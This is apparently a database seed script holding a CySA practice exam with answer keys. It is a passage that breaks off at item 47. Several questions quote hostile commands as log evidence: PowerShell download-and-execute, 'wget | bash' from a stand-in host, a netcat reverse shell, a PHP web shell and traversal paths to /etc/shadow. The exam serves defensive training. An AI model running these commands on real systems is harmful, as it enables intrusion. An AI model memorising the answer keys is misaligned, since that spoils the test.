db.tests.insertOne({
  "category": "cysa",
  "testId": 6,
  "testName": "CySa Practice Test #6 (Formidable)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A security analyst observes the following PowerShell execution in endpoint logs:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-domain.com/a.ps1')\"\n\nSubsequent logs show:\n- Outbound DNS queries with randomized subdomains (e.g., x9a8b7c.malicious-domain.com)\n- Outbound TCP connections to port 8080\n- No associated disk I/O events\n\nWhat is the MOST LIKELY objective of this attack?",
      "options": [
        "Fileless malware execution for persistent C2 communication",
        "Credential dumping using in-memory Mimikatz payloads",
        "Privilege escalation using PowerShell remoting",
        "Lateral movement via WinRM and PSExec"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of in-memory PowerShell execution ('IEX'), DNS queries with randomized subdomains, and no disk activity strongly indicates fileless malware maintaining C2 communication.",
      "examTip": "Fileless malware indicators: in-memory PowerShell execution + randomized DNS queries + minimal disk I/O."
    },
    {
      "id": 2,
      "question": "A threat hunter detects the following:\n- SSH login from a known external threat actor IP.\n- Kernel-level log shows outbound traffic to multiple external hosts over port 4444.\n- The compromised host exhibits unauthorized privilege escalation attempts.\n\nWhat MITRE ATT&CK tactic is represented by these behaviors?",
      "options": [
        "Command and Control (C2)",
        "Lateral Movement",
        "Persistence",
        "Initial Access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "C2 is represented by outbound connections on port 4444 (commonly used for reverse shells).",
      "examTip": "Look for port 4444 and similar indicators for C2. Privilege escalation typically follows initial footholds."
    },
    {
      "id": 3,
      "question": "An advanced persistent threat (APT) group uses custom malware that leverages DNS tunneling for exfiltration. The SOC team identifies unusual DNS traffic patterns with base64-encoded subdomains but no related HTTP/S traffic.\n\nWhat is the FIRST action the SOC team should take to contain this activity?",
      "options": [
        "Implement egress filtering to block outbound DNS requests to suspicious domains",
        "Conduct full packet capture for forensic analysis",
        "Quarantine the affected hosts from the network",
        "Perform memory analysis to detect in-memory malware artifacts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Blocking outbound DNS requests halts data exfiltration via DNS tunneling. Quarantine may come later but does not immediately disrupt exfiltration pathways.",
      "examTip": "For DNS tunneling, prioritize blocking outbound DNS communications to suspicious domains."
    },
    {
      "id": 4,
      "question": "A penetration tester executes the following command on a Linux host:\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nWhat is the PRIMARY purpose of this command?",
      "options": [
        "Obtain a fully interactive TTY shell",
        "Establish a reverse shell for remote control",
        "Bypass sudo restrictions for privileged commands",
        "Execute malicious payloads in memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command spawns a TTY shell, giving the attacker an interactive environment necessary for executing commands more seamlessly after exploitation.",
      "examTip": "Interactive TTY shells improve command execution capabilities post-exploitation—commonly used after gaining low-level shells."
    },
    {
      "id": 5,
      "question": "A web server’s access logs show the following entry:\n\n192.168.1.100 - - [24/Feb/2025:15:20:45 +0000] \"GET /app.php?file=../../../../etc/passwd HTTP/1.1\" 200 1024\n\nWhat vulnerability does this indicate, and what is the MOST effective mitigation?",
      "options": [
        "Directory traversal; implement server-side input validation and path sanitization",
        "Remote file inclusion (RFI); disable remote file execution in application configurations",
        "SQL injection; use parameterized queries in all database interactions",
        "Command injection; restrict shell command execution permissions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of '../../../../etc/passwd' shows a directory traversal attempt. Input validation and path sanitization on the server side prevent such attacks.",
      "examTip": "Directory traversal attacks exploit improper file path validation—ensure rigorous server-side checks."
    },
    {
      "id": 6,
      "question": "A SIEM triggers an alert based on these correlated events:\n- User 'admin' logs in successfully from IP 203.0.113.12.\n- Within 10 seconds, the same user logs in from IP 198.51.100.22 (different geo-location).\n- Both sessions perform file transfer operations to external cloud storage.\n\nWhat is the MOST LIKELY explanation for these observations?",
      "options": [
        "Account compromise involving credential theft and rapid data exfiltration",
        "Insider threat performing authorized data transfers from multiple locations",
        "Valid user accessing cloud storage using a VPN with dynamic exit nodes",
        "Failed brute force attack triggering false positives in SIEM correlations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Rapid logins from geographically distant IPs and subsequent data transfers strongly indicate credential compromise and exfiltration.",
      "examTip": "Impossible travel patterns with immediate data movement are high-confidence indicators of credential theft."
    },
    {
      "id": 7,
      "question": "An organization’s vulnerability scan detects a critical remote code execution (RCE) flaw in an internet-facing web application. A patch is unavailable, and downtime is not an option.\n\nWhich compensating control MOST effectively reduces exploitation risk?",
      "options": [
        "Deploy a Web Application Firewall (WAF) with virtual patching to block exploit patterns",
        "Temporarily disable all external access to the application",
        "Increase monitoring and log analysis for exploit attempts",
        "Implement strict input validation for all user-supplied data"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A WAF with virtual patching immediately mitigates known exploit vectors while allowing the application to remain online.",
      "examTip": "Virtual patching via WAFs is an effective temporary control for high-severity, unpatched vulnerabilities."
    },
    {
      "id": 8,
      "question": "During threat hunting, a PowerShell script is observed running with the following characteristics:\n- Uses '-ExecutionPolicy Bypass' and '-WindowStyle Hidden'\n- Connects to a known malicious C2 server via HTTP\n- Downloads and executes further payloads in memory\n\nWhat defensive control would MOST effectively prevent this behavior in the future?",
      "options": [
        "Application whitelisting to block unauthorized PowerShell executions",
        "Blocking HTTP traffic at the firewall from all endpoints",
        "Configuring antivirus to detect obfuscated PowerShell commands",
        "Enabling PowerShell logging with script block transcription"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Application whitelisting ensures only approved scripts can run, effectively blocking unauthorized PowerShell-based attacks.",
      "examTip": "Application whitelisting is a top defense against fileless malware leveraging PowerShell."
    },
    {
      "id": 9,
      "question": "An internal review shows that users often bypass formal change control processes. Which of the following governance improvements would BEST address this?",
      "options": [
        "Implementing a mandatory, auditable change management policy enforced by executive leadership",
        "Deploying an automated patching solution across all endpoints",
        "Requiring dual-factor authentication for administrator accounts",
        "Restricting remote access for non-technical staff"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A rigorous change management policy, backed by executive enforcement, closes the gap in governance by ensuring users cannot bypass formal processes.",
      "examTip": "Look for a governance-level solution that addresses procedural compliance rather than purely technical controls."
    },
    {
      "id": 10,
      "question": "A cloud security engineer detects a sudden spike in GPU utilization across multiple virtual machines (VMs) in different regions. Billing alerts also show unexpected cost increases.\n\nWhat is the MOST LIKELY cause of this activity?",
      "options": [
        "Cryptojacking attack leveraging cloud resources for cryptocurrency mining",
        "DDoS attack preparation using cloud-hosted botnets",
        "Lateral movement by attackers searching for sensitive data",
        "Automated penetration testing initiated by internal teams"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Sudden GPU spikes and increased billing charges are strong indicators of cryptojacking, where attackers use cloud infrastructure for mining cryptocurrency.",
      "examTip": "Monitor cloud resource usage and set automated billing alerts to detect cryptojacking early."
    },
    {
      "id": 11,
      "question": "A SOC analyst reviews logs from an endpoint detection and response (EDR) tool showing:\n\n- powershell.exe -ExecutionPolicy Bypass -NoProfile -c \"IEX((New-Object Net.WebClient).DownloadString('http://malicious-server.com/ps.ps1'))\"\n- Outbound HTTP traffic to port 8080\n- Suspicious child processes spawning 'cmd.exe' and 'reg.exe'\n\nWhat is the MOST LIKELY purpose of this PowerShell activity?",
      "options": [
        "Executing fileless malware for persistent remote access",
        "Harvesting credentials from LSASS memory",
        "Disabling endpoint defenses for lateral movement",
        "Exfiltrating sensitive data via HTTP tunneling"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The PowerShell command downloads and executes a script directly in memory (fileless execution). Child processes like 'cmd.exe' and registry edits often indicate persistence tactics.",
      "examTip": "Watch for in-memory execution patterns in PowerShell logs—key indicators of fileless malware."
    },
    {
      "id": 12,
      "question": "Which of the following MOST accurately differentiates governance risk from operational risk within a security program?",
      "options": [
        "Governance risk includes compliance penalties, whereas operational risk covers patch failures",
        "Governance risk is exclusively about third-party vendors, whereas operational risk is internal",
        "Governance risk and operational risk are synonymous in cybersecurity",
        "Governance risk focuses on strategic oversight and policy compliance, whereas operational risk deals with day-to-day security failures"
      ],
      "correctAnswerIndex": 3,
      "explanation": "Governance risk pertains to strategic, high-level oversight and policy alignment, while operational risk involves routine security tasks and potential failures in daily operations.",
      "examTip": "Understand the hierarchy of risk. Governance addresses strategic directives; operational risk is about execution and day-to-day vulnerabilities."
    },
    {
      "id": 13,
      "question": "A vulnerability assessment reveals that an application relies on user-controlled file paths for file retrieval. A penetration tester successfully retrieves `/etc/passwd` using the following URL:\n\nhttps://vulnerable-app.com/download?file=../../../../etc/passwd\n\nWhat is the BEST control to mitigate this vulnerability?",
      "options": [
        "Implement server-side input validation and path sanitization",
        "Apply file permissions restricting access to system directories",
        "Enable encryption for all data at rest on the server",
        "Deploy reverse proxy filtering for user-supplied parameters"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Directory traversal attacks are mitigated by sanitizing file paths and validating user input at the server side to prevent unauthorized file access.",
      "examTip": "Always sanitize and validate file path parameters to prevent directory traversal exploits."
    },
    {
      "id": 14,
      "question": "An attacker exploits a vulnerable web application and uploads a PHP web shell named 'shell.php.jpg'. The server saves the file, and the attacker accesses:\n\nhttp://target-site.com/uploads/shell.php.jpg\n\nWhich security misconfiguration MOST likely allowed this exploit?",
      "options": [
        "Unrestricted file upload without proper content-type validation",
        "Lack of server-side encryption for uploaded files",
        "Cross-site scripting (XSS) vulnerability in file handling",
        "Improperly configured CORS policies on the web server"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Allowing file uploads without verifying MIME types and file content leads to remote code execution via disguised malicious files.",
      "examTip": "File upload validations should check content type, file extension, and ensure storage in non-executable directories."
    },
    {
      "id": 15,
      "question": "A SOC analyst identifies the following user behavior pattern:\n- User logs in from an IP in Asia at 10:15 AM.\n- Same user account logs in from Europe at 10:25 AM.\n- Both sessions initiate file transfers to an unknown external host.\n\nWhich security control would MOST effectively prevent this type of attack?",
      "options": [
        "Multi-factor authentication (MFA) for all external logins",
        "Geo-IP filtering to block access from specific regions",
        "Account lockout policies after failed login attempts",
        "Privileged access management (PAM) for sensitive accounts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Impossible travel patterns combined with data exfiltration strongly suggest credential compromise. MFA would prevent unauthorized access even with stolen credentials.",
      "examTip": "MFA is critical for preventing attacks that rely on stolen credentials, especially in geographically inconsistent login patterns."
    },
    {
      "id": 16,
      "question": "An attacker gains access to a cloud environment and provisions high-performance compute instances across multiple regions. Monitoring tools indicate unusual GPU usage and high billing costs.\n\nWhat is the MOST LIKELY objective of this attacker?",
      "options": [
        "Cryptojacking using cloud resources for cryptocurrency mining",
        "Lateral movement to identify and access sensitive data",
        "Preparation of DDoS attacks using cloud infrastructure",
        "Deployment of phishing infrastructure for credential harvesting"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Attackers use unauthorized GPU-intensive instances for cryptocurrency mining, resulting in unexpected cloud costs for the victim organization.",
      "examTip": "Monitor cloud billing for cost anomalies—cryptojacking commonly causes unexpected resource utilization spikes."
    },
    {
      "id": 17,
      "question": "A recent merger has complicated the organization’s compliance posture. Which governance action BEST ensures both organizations’ policies are harmonized?",
      "options": [
        "Purchase new IDS/IPS appliances to secure merged networks",
        "Create a single comprehensive policy repository and alignment task force",
        "Hire a separate CISO for each merged division",
        "Disable all legacy systems in the acquired company"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Integrating policies into a single repository and forming a governance alignment task force ensures consistent standards across the merged entities.",
      "examTip": "Mergers often create policy overlap. Effective governance merges or reconciles these policies to maintain compliance and clarity."
    },
    {
      "id": 18,
      "question": "A malware sample in a sandbox shows the following behaviors:\n- Creates scheduled tasks for persistence\n- Establishes HTTP connections to known malicious IP addresses\n- Encrypts user files and deletes shadow copies\n\nWhich type of malware BEST matches these characteristics?",
      "options": [
        "Ransomware",
        "Trojan with persistent C2 capabilities",
        "Rootkit with system-level obfuscation",
        "Worm with self-propagation behavior"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of file encryption, ransom demands, and deletion of recovery points clearly indicates ransomware.",
      "examTip": "Ransomware often deletes backups and shadow copies to prevent recovery—monitor for these behaviors during incident response."
    },
    {
      "id": 19,
      "question": "A forensic investigation finds that an attacker leveraged a vulnerability allowing code execution through the following payload:\n\n<?php system($_GET['cmd']); ?>\n\nWhat type of vulnerability does this represent?",
      "options": [
        "Remote code execution (RCE) via file upload",
        "Cross-site scripting (XSS) via dynamic content injection",
        "SQL injection through user input manipulation",
        "Local file inclusion (LFI) via directory traversal"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The PHP code snippet allows execution of system commands passed via URL parameters, indicating a remote code execution vulnerability.",
      "examTip": "Avoid evaluating user inputs as code—use secure coding practices to prevent RCE vulnerabilities."
    },
    {
      "id": 20,
      "question": "A security engineer discovers that an S3 bucket hosting sensitive data is publicly accessible and has write permissions enabled for all users. No malicious activity has been detected yet.\n\nWhat should be the FIRST step to secure the bucket?",
      "options": [
        "Restrict access permissions to authorized users only",
        "Enable encryption at rest for all data in the bucket",
        "Monitor and analyze access logs for suspicious activities",
        "Configure CloudTrail to capture all data access events"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The most critical action is immediately restricting public access to prevent potential unauthorized data exposure.",
      "examTip": "Cloud storage services like S3 should never have unrestricted public access unless explicitly intended—apply least-privilege principles."
    },
    {
      "id": 21,
      "question": "Which of the following items is the MOST critical to include in a governance policy addressing risk categorization?",
      "options": [
        "Detailed intrusion detection signatures for all known attack vectors",
        "Roles and responsibilities for risk acceptance decisions",
        "An overview of encryption algorithms to use for data at rest",
        "Guidelines for daily system health checks"
      ],
      "correctAnswerIndex": 1,
      "explanation": "A governance policy for risk categorization must specify who makes risk acceptance decisions and under what conditions, ensuring accountability.",
      "examTip": "Governance policies define authority and accountability. Operational details (e.g., IDS signatures) belong in more technical documents."
    }
    {
      "id": 22,
      "question": "An organization’s SIEM triggers alerts showing multiple failed login attempts across different user accounts from the same IP address. The attempts occur over an extended period without triggering account lockouts.\n\nWhich attack type is MOST LIKELY occurring?",
      "options": [
        "Password spraying attack",
        "Credential stuffing attack",
        "Brute force attack",
        "Pass-the-hash attack"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Password spraying involves attempting common passwords across multiple accounts slowly to avoid lockouts—matching the observed pattern.",
      "examTip": "Implement account lockout policies and monitor for failed login patterns to detect password spraying attacks."
    },
    {
      "id": 23,
      "question": "A SOC analyst identifies a suspicious PowerShell command:\n\npowershell.exe -nop -w hidden -enc SQBtAG0AbwByAHQAIABkAGEAdABh\n\nWhat is the attacker’s MOST LIKELY objective using this command?",
      "options": [
        "Obfuscate malicious PowerShell execution using base64 encoding",
        "Dump LSASS memory to extract plaintext credentials",
        "Execute remote code using PowerShell remoting",
        "Establish persistence through scheduled tasks"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '-enc' parameter signifies base64 encoding, commonly used to obfuscate PowerShell commands and bypass security controls.",
      "examTip": "Base64-encoded PowerShell commands often indicate obfuscation—implement script block logging for detection."
    },
    {
      "id": 24,
      "question": "A penetration tester uploads a file named 'payload.php.jpg' to a web application that lacks proper file validation. Upon accessing the file, the tester successfully executes commands on the server.\n\nWhich vulnerability BEST explains this outcome?",
      "options": [
        "Unrestricted file upload enabling remote code execution",
        "Cross-site scripting (XSS) exploiting file input fields",
        "Server-side request forgery (SSRF) leveraging file handlers",
        "Insecure deserialization through crafted file payloads"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Uploading disguised PHP files that execute on access indicates an unrestricted file upload vulnerability allowing RCE.",
      "examTip": "Validate file extensions and MIME types and store uploads in non-executable directories."
    },
    {
      "id": 25,
      "question": "A cloud security engineer detects a new IAM user with administrative privileges was created without authorization. CloudTrail logs show the following:\n- The user creation was initiated by a compromised API key.\n- The API key had read-only permissions initially.\n\nWhich security issue MOST LIKELY enabled this attack?",
      "options": [
        "Privilege escalation due to overly permissive IAM policies",
        "Lack of multi-factor authentication (MFA) for API access",
        "Hard-coded credentials exposed in public repositories",
        "Misconfigured network access control lists (ACLs)"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The attacker escalated privileges using an API key that should not have had permissions to create admin users—indicating IAM policy flaws.",
      "examTip": "Use least-privilege IAM policies and monitor API key activities to prevent privilege escalation."
    },
    {
      "id": 26,
      "question": "An attacker gains access to a cloud provider account and spins up multiple high-compute instances across various regions. Billing reports show unexpected spikes in costs.\n\nWhat is the PRIMARY goal of the attacker?",
      "options": [
        "Cryptocurrency mining (cryptojacking)",
        "Launching distributed denial-of-service (DDoS) attacks",
        "Establishing a botnet for future campaigns",
        "Performing cloud reconnaissance for lateral movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "High-compute instance usage with increased billing suggests cryptojacking, where attackers mine cryptocurrency using stolen cloud resources.",
      "examTip": "Monitor cloud costs and usage patterns for anomalies—cryptojacking attacks often cause sudden spikes in expenses."
    },
    {
      "id": 27,
      "question": "A SIEM generates alerts for the following sequence of events:\n- Successful login from an unfamiliar IP address\n- Creation of multiple user accounts with admin privileges\n- Outbound traffic to an external C2 server on port 8080\n\nWhat MITRE ATT&CK tactic BEST represent these activities?",
      "options": [
        "Persistence",
        "Privilege Escalation",
        "Initial Access",
        "Lateral Movement"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Creating admin users reflects persistence, ensuring long-term access. Outbound C2 traffic on port 8080 suggests command and control activity.",
      "examTip": "Look for admin account creation and outbound connections—strong indicators of persistence and C2 tactics."
    },
    {
      "id": 28,
      "question": "Which of the following is the MOST effective governance practice for monitoring adherence to data privacy regulations across multiple departments?",
      "options": [
        "A single monthly email reminder of data handling protocols",
        "Allowing each department to define its own privacy standards",
        "Establishing a Privacy Oversight Committee to perform regular department reviews",
        "Deploying new encryption software for all remote workers"
      ],
      "correctAnswerIndex": 2,
      "explanation": "A dedicated Privacy Oversight Committee ensures consistent adherence by regularly reviewing departmental practices, which is a governance-level process.",
      "examTip": "When multiple departments handle sensitive data, centralized oversight is crucial to maintain uniform privacy practices."
    },
    {
      "id": 29,
      "question": "An organization discovers that TLS 1.0 is still enabled on public-facing web servers. PCI DSS compliance requires secure encryption.\n\nWhy is TLS 1.0 considered a critical risk?",
      "options": [
        "It is vulnerable to known attacks like BEAST and POODLE.",
        "It lacks support for perfect forward secrecy (PFS).",
        "It does not support modern key exchange mechanisms.",
        "It enables downgrade attacks that lead to SSL 3.0 use."
      ],
      "correctAnswerIndex": 0,
      "explanation": "TLS 1.0 is vulnerable to BEAST and POODLE attacks, making it non-compliant with PCI DSS standards and posing a critical security risk.",
      "examTip": "Ensure TLS 1.2+ support for public-facing services to maintain PCI DSS compliance and mitigate known vulnerabilities."
    },
    {
      "id": 30,
      "question": "A SOC team detects PowerShell commands executing with the following pattern:\n\npowershell.exe -nop -w hidden -enc UABvAHcAZQByAHMAaABlAGwAbA==\n\nSubsequent analysis shows outbound connections to known malicious IPs and the creation of scheduled tasks.\n\nWhat type of malware behavior does this MOST LIKELY represent?",
      "options": [
        "Trojan enabling persistent remote access",
        "Worm attempting lateral movement across the network",
        "Ransomware preparing for file encryption",
        "Rootkit hiding malicious kernel-level operations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Obfuscated PowerShell execution, persistence mechanisms (scheduled tasks), and external C2 connections are hallmarks of Trojan activity.",
      "examTip": "Trojan behaviors often combine obfuscated code execution with persistent C2 communication—monitor PowerShell logs for these patterns."
    },
    {
      "id": 31,
      "question": "A SOC analyst observes the following in web server logs:\n\n192.168.10.15 - - [25/Feb/2025:14:20:10 +0000] \"GET /index.php?page=../../../../etc/shadow HTTP/1.1\" 200 1450\n\nWhich vulnerability is being exploited and what is the potential impact?",
      "options": [
        "Directory traversal; exposure of sensitive authentication files",
        "Remote code execution (RCE); execution of arbitrary commands",
        "SQL injection; unauthorized access to database contents",
        "Cross-site scripting (XSS); injection of malicious scripts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The '../../../../etc/shadow' path indicates a directory traversal attack aiming to access sensitive system files like the shadow file containing password hashes.",
      "examTip": "Directory traversal attempts often include '../' sequences—validate and sanitize file path inputs."
    },
    {
      "id": 32,
      "question": "A cloud audit reveals that an AWS S3 bucket storing customer PII data has public read/write permissions. No encryption is enabled. No malicious access has been detected yet.\n\nWhat is the MOST critical immediate action?",
      "options": [
        "Remove public access permissions immediately",
        "Enable encryption at rest using AWS KMS",
        "Configure access logging for monitoring purposes",
        "Apply versioning to protect against accidental deletion"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The immediate step is to remove public access permissions to prevent unauthorized data exposure. Encryption and logging are important but secondary measures.",
      "examTip": "S3 buckets containing sensitive data should never have public read/write permissions—apply least-privilege policies."
    },
    {
      "id": 33,
      "question": "A penetration tester discovers the following encoded PowerShell command in process logs:\n\npowershell.exe -nop -w hidden -enc UABvAHcAZQByAHMAaABlAGwAbA==\n\nWhich detection technique would MOST effectively reveal such obfuscated commands?",
      "options": [
        "Enable PowerShell script block logging",
        "Deploy endpoint antivirus solutions",
        "Implement strict network egress filtering",
        "Analyze firewall logs for outbound traffic anomalies"
      ],
      "correctAnswerIndex": 0,
      "explanation": "PowerShell script block logging captures the full content of executed scripts, revealing obfuscated or encoded commands that might bypass traditional defenses.",
      "examTip": "Script block logging is crucial for detecting obfuscated PowerShell commands—ensure it's enabled in secure configurations."
    },
    {
      "id": 34,
      "question": "A web application generates session tokens in a predictable pattern. A penetration tester is able to guess valid session tokens and access other users’ sessions.\n\nWhich vulnerability BEST describes this issue?",
      "options": [
        "Session fixation due to predictable session identifiers",
        "Broken authentication through weak session management",
        "Cross-site request forgery (CSRF) exploiting session tokens",
        "IDOR (Insecure Direct Object Reference) via session enumeration"
      ],
      "correctAnswerIndex": 1,
      "explanation": "Predictable session tokens represent broken authentication, allowing attackers to hijack sessions without valid credentials.",
      "examTip": "Session tokens should be unpredictable and securely generated to prevent session hijacking risks."
    },
    {
      "id": 35,
      "question": "A board member requests evidence that the organization’s risk management approach is aligned with legal obligations. Which of the following BEST addresses this from a governance standpoint?",
      "options": [
        "Enhancing endpoint protection with machine learning capabilities",
        "Facilitating an external compliance audit to validate processes and controls",
        "Switching from weekly to daily vulnerability scanning",
        "Establishing a top-tier bug bounty program"
      ],
      "correctAnswerIndex": 1,
      "explanation": "An external compliance audit provides independent validation that the organization’s governance, risk management, and controls meet legal requirements.",
      "examTip": "Governance often involves third-party reviews or audits to demonstrate adherence to legal and regulatory obligations."
    },
    {
      "id": 36,
      "question": "An attacker uses the following command on a compromised server:\n\nwget http://malicious-site.com/payload.sh -O- | bash\n\nWhat is the PRIMARY objective of this command?",
      "options": [
        "Download and execute a malicious script in memory",
        "Establish persistence through cron job creation",
        "Escalate privileges by modifying kernel parameters",
        "Exfiltrate data using HTTP POST requests"
      ],
      "correctAnswerIndex": 0,
      "explanation": "This command downloads a script and immediately executes it in memory using bash, avoiding file system detection—common in fileless attack techniques.",
      "examTip": "Monitor for use of 'wget' or 'curl' combined with execution pipes ('| bash')—indicators of fileless attacks."
    },
    {
      "id": 37,
      "question": "A forensic investigation identifies the following Netcat activity:\n\nnc -nv 198.51.100.10 4444 -e /bin/bash\n\nWhich security risk is MOST associated with this activity?",
      "options": [
        "Reverse shell providing remote command execution",
        "Credential theft via keylogging payloads",
        "Data exfiltration using encrypted TCP channels",
        "Distributed Denial-of-Service (DDoS) coordination"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The Netcat command with '-e /bin/bash' establishes a reverse shell, granting remote control of the host to the attacker.",
      "examTip": "Outbound connections to suspicious IPs on high-numbered ports like 4444 should be investigated as potential reverse shell activities."
    },
    {
      "id": 38,
      "question": "A penetration tester discovers that a web application processes the following user-supplied URL:\n\nhttp://example.com/view?file=../../../../etc/passwd\n\nWhich mitigation technique would MOST effectively prevent this vulnerability?",
      "options": [
        "Server-side input validation and file path sanitization",
        "Deployment of web application firewalls (WAF)",
        "Encrypting sensitive system files on the web server",
        "Implementing HTTPS for all web application traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Directory traversal attacks are prevented by sanitizing user inputs and implementing strict file path validation on the server side.",
      "examTip": "Validate and sanitize all file path inputs to prevent unauthorized file access through directory traversal exploits."
    },
    {
      "id": 39,
      "question": "A cloud security audit reveals that a critical storage bucket has public write permissions enabled. Shortly after, unauthorized files containing malicious JavaScript are found in the bucket.\n\nWhat is the MOST LIKELY impact of this security issue?",
      "options": [
        "Malware distribution to users accessing the bucket’s content",
        "Credential theft via phishing pages hosted in the bucket",
        "Data exfiltration through public file uploads",
        "Denial-of-service (DoS) by uploading large files"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Malicious JavaScript uploaded to publicly accessible storage could be served to users, resulting in malware distribution or drive-by attacks.",
      "examTip": "Never allow public write access to cloud storage buckets unless explicitly necessary—enforce least-privilege permissions."
    },
    {
      "id": 40,
      "question": "A malware sample analyzed in a sandbox demonstrates the following behaviors:\n- Encrypts user data\n- Deletes volume shadow copies\n- Contacts a known Bitcoin wallet address\n\nWhich type of malware BEST fits these characteristics?",
      "options": [
        "Ransomware",
        "Trojan",
        "Rootkit",
        "Worm"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Encryption of user data, deletion of recovery options (shadow copies), and referencing a Bitcoin wallet are typical behaviors of ransomware.",
      "examTip": "Frequent ransomware behaviors include data encryption and removal of backup mechanisms to force ransom payment."
    },
    {
      "id": 41,
      "question": "A threat intelligence report highlights an APT group using Domain Generation Algorithms (DGA) for C2 communication. A SOC analyst detects repeated DNS queries to domains such as `j4k5l6p7.example.net` and `m9n8o7q6.sample.org` with no corresponding web traffic.\n\nWhat is the MOST effective detection strategy for identifying DGA-based activity?",
      "options": [
        "Monitor DNS logs for high volumes of NXDOMAIN responses and randomized domain patterns",
        "Deploy a web application firewall (WAF) to inspect outbound traffic for suspicious domains",
        "Apply strict egress filtering to block all non-approved DNS traffic",
        "Use endpoint detection and response (EDR) tools to analyze process behavior"
      ],
      "correctAnswerIndex": 0,
      "explanation": "DGA-generated domains often result in high NXDOMAIN rates and appear as randomized patterns. Monitoring DNS logs for these anomalies effectively detects DGA activity.",
      "examTip": "DGA indicators: randomized domain names, high NXDOMAIN rates, and lack of correlated web traffic."
    },
    {
      "id": 42,
      "question": "An attacker exploited an insecure deserialization vulnerability and executed arbitrary code on a web application server. Which security measure would BEST prevent this type of attack?",
      "options": [
        "Validate and sanitize all serialized data before deserialization",
        "Deploy runtime application self-protection (RASP) solutions",
        "Apply input validation to all user-supplied parameters",
        "Encrypt serialized objects during transmission"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Insecure deserialization attacks occur when untrusted data is deserialized without proper validation, enabling arbitrary code execution. Validating and sanitizing data before deserialization prevents this risk.",
      "examTip": "Never deserialize untrusted data without validation—consider safe serialization formats like JSON over binary objects."
    },
    {
      "id": 43,
      "question": "A penetration tester gains shell access to a target Linux host with limited privileges. They run the following command:\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nWhat is the PRIMARY purpose of this action?",
      "options": [
        "Upgrade the shell to a fully interactive TTY shell",
        "Escalate privileges to root using Python modules",
        "Establish a persistent reverse shell connection",
        "Bypass SELinux restrictions on shell access"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Spawning a TTY shell using Python provides a fully interactive shell with improved functionality (e.g., command history, tab completion), essential for post-exploitation activities.",
      "examTip": "Attackers often upgrade basic shells to fully interactive ones using Python or Perl for better usability during exploitation."
    },
    {
      "id": 44,
      "question": "A cloud security engineer finds multiple unauthorized virtual machines (VMs) running GPU-intensive workloads across multiple regions. Billing costs have spiked significantly.\n\nWhat is the MOST LIKELY explanation for this activity?",
      "options": [
        "Cryptocurrency mining (cryptojacking) using compromised cloud accounts",
        "Cloud reconnaissance for lateral movement opportunities",
        "Distributed Denial-of-Service (DDoS) attack staging",
        "Adversary emulation exercises by a red team"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Sudden GPU workload spikes and increased billing often indicate cryptojacking, where attackers exploit cloud resources for mining cryptocurrency.",
      "examTip": "Enable billing alerts and monitor cloud instance utilization to detect and mitigate cryptojacking early."
    },
    {
      "id": 45,
      "question": "A SOC analyst reviews network traffic logs and observes repeated outbound TCP connections to an external IP over port 4444. The following Netcat command was later found in endpoint logs:\n\nnc -nv 203.0.113.45 4444 -e /bin/bash\n\nWhat is the MOST immediate action to contain this threat?",
      "options": [
        "Block outbound connections to port 4444 at the network firewall",
        "Conduct a full memory dump on the compromised endpoint",
        "Disable Netcat binaries across all internal systems",
        "Initiate forensic analysis of endpoint disk images"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Port 4444 is commonly associated with reverse shell communications. Blocking outbound traffic on this port immediately disrupts attacker C2 channels.",
      "examTip": "Reverse shells typically involve high-numbered ports like 4444—restrict these at the network perimeter."
    },
    {
      "id": 46,
      "question": "An organization’s vulnerability scan identifies the presence of SMBv1 on internal servers. Considering recent ransomware outbreaks leveraging SMBv1, what is the MOST immediate mitigation step?",
      "options": [
        "Disable SMBv1 on all affected systems immediately",
        "Segment the affected servers from the rest of the network",
        "Apply the latest security patches and updates to all servers",
        "Enable host-based firewalls to restrict SMB traffic"
      ],
      "correctAnswerIndex": 0,
      "explanation": "SMBv1 is obsolete and highly vulnerable to ransomware (e.g., WannaCry). Disabling it immediately is the most effective risk-reduction measure.",
      "examTip": "Legacy protocols like SMBv1 should be disabled wherever possible—modern replacements (e.g., SMBv2/3) offer improved security."
    },
    {
      "id": 47,
      "question": "A CISO notices inconsistent application of security controls across different business units. Which of the following governance actions BEST resolves this discrepancy?",
      "options": [
        "Increasing the budget for advanced intrusion detection solutions",
        "Launching an internal bug bounty program to identify missing controls",
